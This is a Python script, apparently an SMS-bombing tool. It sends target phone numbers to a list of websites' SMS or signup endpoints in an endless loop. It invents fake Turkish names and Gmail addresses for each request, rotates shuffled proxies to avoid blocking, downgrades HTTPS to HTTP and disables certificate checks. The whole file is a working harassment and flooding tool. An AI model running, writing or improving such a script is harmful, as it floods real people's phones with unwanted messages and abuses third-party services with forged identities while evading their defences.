import requests
import random
import string
import time
import itertools
from website_config import website_configs
from colorama import Fore, init

init(autoreset=True)

def random_turkish_name_surname_gmail():
    first_names = [
        'Alp', 'Aras', 'Ata', 'Aydin', 'Baran', 'Berk', 'Can', 'Cem', 'Deniz', 'Doruk',
        'Ege', 'Eren', 'Evren', 'Ilker', 'Kaan', 'Kerem', 'Koray', 'Mert', 'Metin', 'Murat',
        'Okan', 'Onur', 'Ozan', 'Polat', 'Sarp', 'Serkan', 'Sinan', 'Tarkan', 'Timur', 'Ufuk',
        'Ugur', 'Volkan', 'Yagiz', 'Yalin', 'Yavuz', 'Yigit', 'Zeki', 'Adil', 'Akin', 'Altan'
    ]
    
    last_names = [
        'Acar', 'Aksu', 'Aydin', 'Bilgin', 'Bulut', 'Cevik', 'Ciftci', 'Coskun', 'Demirci', 'Dincer',
        'Dogan', 'Erol', 'Gok', 'Gokce', 'Gokmen', 'Goktas', 'Guler', 'Gunes', 'Kahraman', 'Kilic',
        'Kose', 'Kurt', 'Ozcan', 'Ozel', 'Ozturk', 'Sari', 'Savas', 'Sezgin', 'Simsek', 'Soylu',
        'Tasci', 'Tekin', 'Tok', 'Tosun', 'Turan', 'Ucar', 'Uysal', 'Yalcin', 'Yavuz', 'Yildirim'
    ]

    first_name = random.choice(first_names)
    last_name = random.choice(last_names)

    #first_name, last_name, gmail = random_turkish_name_surname_gmail()

    def random_string(length):
        return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))

    username = f"{first_name.lower()}{last_name.lower()}{random_string(4)}"
    gmail_address = f"{username}@gmail.com"
    return first_name, last_name, gmail_address

def shuffle_proxies(proxies):
    random.shuffle(proxies)
    return proxies

def get_next_proxy(proxy_iterator, proxies):
    try:
        return next(proxy_iterator)
    except StopIteration:
        proxy_iterator = itertools.cycle(shuffle_proxies(proxies))
        return next(proxy_iterator)
    
def handle_response(response, success_msg, failure_msg, proxy, developer_mode=False):
    if developer_mode:
        print(f"Response: {response.text}")
    if success_msg in response.text:
        if proxy != "null":
            return True, True, 'successful'
        else:
            return True, 'successful'
    elif failure_msg in response.text:
        if proxy != "null":
            return False, True, 'failure'
        else:
            return False, 'failure'
    else:
        if proxy != "null":
            return False, True, 'unknown response'
        else:
            return False, 'unknown response'
        

def send_request(session, phone_number, first_name, last_name, gmail, proxy, config, developer_mode=False):
    values = {
        'first_name': first_name,
        'last_name': last_name,
        'gmail': gmail,
        'phone_number': phone_number
    }
    try:
        url = config['url']
        if url.startswith('https://'):
            url = url.replace('https://', 'http://')
        method = config.get('method', 'POST')  # Default to 'POST' if not specified
        if 'payload_function' in config:
            payload_function = config['payload_function']
            payload = payload_function(first_name, last_name, gmail, phone_number)
        else:
            payload = {k: v.format(**values) for k, v in config['payload'].items() if any(val in v for val in values.keys())}

        if proxy != "null":
            try:
                proxy_parts = proxy.split(':')
                if len(proxy_parts) == 4:
                    ip, port, username, password = proxy_parts
                    proxy_url = f'http://{username}:{password}@{ip}:{port}'
                else:
                    ip, port = proxy_parts
                    proxy_url = f'http://{ip}:{port}'
                proxies = {'http': proxy_url}
                if method.upper() == 'POST':
                    response = session.post(url, proxies=proxies, data=payload, timeout=50, verify=False)
                elif method.upper() == 'GET':
                    response = session.get(url, proxies=proxies, params=payload, timeout=50, verify=False)
                return handle_response(response, config['success'], config['failure'], proxy, developer_mode)
            except Exception as e:
                if developer_mode:
                    print(f"{Fore.RED}Error testing proxy '{proxy}': {e}{Fore.RESET}")
                return False, False, 'exception'
        else:
            if method.upper() == 'POST':
                try:
                    response = session.post(url, data=payload, timeout=50, verify=False)
                except requests.exceptions.Timeout:
                    return False, False, 'response timeout'
            elif method.upper() == 'GET':
                try:
                    response = session.get(url, params=payload, timeout=50, verify=False)
                except requests.exceptions.Timeout:
                    return False, False, 'response timeout'
            return handle_response(response, config['success'], config['failure'], proxy, developer_mode)
    except Exception as e:
        if developer_mode:
            print(f"Error: {str(e)}")
        return False, False, 'exception'

def send_sms_requests(phone_numbers, proxies, developer_mode=False):
    total_successful_requests = 0
    total_failed_requests = 0
    successful_requests = {phone_number: 0 for phone_number in phone_numbers}
    failed_requests = {phone_number: 0 for phone_number in phone_numbers}
    iteration = 0

    if len(proxies) > 0:
        proxies = shuffle_proxies(proxies)
        proxy_iterator = itertools.cycle(proxies)
    
    # Create session object
    session = requests.Session()

    while True:
        iteration += 1
        for index, phone_number in enumerate(phone_numbers):
            first_name, last_name, gmail = random_turkish_name_surname_gmail()
            start_time = time.time()

            for website, config in website_configs.items():
                success = False
                success_request = False
                msg = ''
                proxy_used = None
                failure_count = 0  # Initialize failure count for each website

                while not success_request and len(proxies) > 0 and failure_count < 5:
                    proxy_used = get_next_proxy(proxy_iterator, proxies)
                    success, success_request, msg = send_request(session, phone_number, first_name, last_name, gmail, proxy_used, config, developer_mode)
        
                    if not success_request:
                        print(f"{Fore.RED}Proxy {proxy_used} failed. Attempting with another proxy.{Fore.RESET}")
                        proxy_used = get_next_proxy(proxy_iterator, proxies)
                        failure_count += 1  # Increment failure count on failure

                if failure_count >= 5:
                    print(f"{Fore.RED}5 times failed for {website}. Moving on to next website.{Fore.RESET}")
                    break  # break from this inner loop and move to the next website

                if len(proxies) <= 0:
                    success, msg = send_request(session, phone_number, first_name, last_name, gmail, "null", config, developer_mode)

                if success:
                    successful_requests[phone_number] += 1
                    total_successful_requests += 1
                elif not success:
                    failed_requests[phone_number] += 1
                    total_failed_requests += 1

                if developer_mode:
                    print(f"Response: {msg}")
                print(f"{Fore.CYAN}[{website}]{Fore.GREEN} | Proxy: {proxy_used} | Number: {index + 1}/{len(phone_numbers)} ({phone_number}) | Success: {successful_requests[phone_number]} | {Fore.RED}Failed: {failed_requests[phone_number]}{Fore.RESET}")

            elapsed_time = time.time() - start_time
            estimated_remaining_time = (elapsed_time / (index + 1)) * (len(phone_numbers) - (index + 1))
            print(f"{Fore.YELLOW}Loop: {iteration} | Number {index + 1}/{len(phone_numbers)} completed. Estimated time remaining until end of loop: {estimated_remaining_time:.2f} seconds")

            print(f"{Fore.CYAN}Total successful requests across all numbers: {total_successful_requests} | Total failed requests: {total_failed_requests}")